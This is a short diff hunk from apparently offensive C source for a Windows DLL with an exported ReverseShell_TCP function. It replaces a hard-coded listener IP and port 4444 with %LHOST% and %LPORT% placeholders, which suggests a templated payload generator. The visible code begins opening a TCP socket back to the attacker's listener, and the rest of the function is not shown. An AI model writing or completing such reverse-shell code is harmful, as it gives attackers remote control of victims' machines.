@@ -24,8 +24,8 @@ __declspec(dllexport) void ReverseShell_TCP(LPVOID param) {
         return;
     }
 
-    const char* ip = "192.168.48.132";  // IP du serveur
-    int port = 4444;  // Le port du serveur
+    const char* ip = %LHOST%;  // IP du serveur
+    int port = %LPORT%;  // Le port du serveur
 
     SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) {
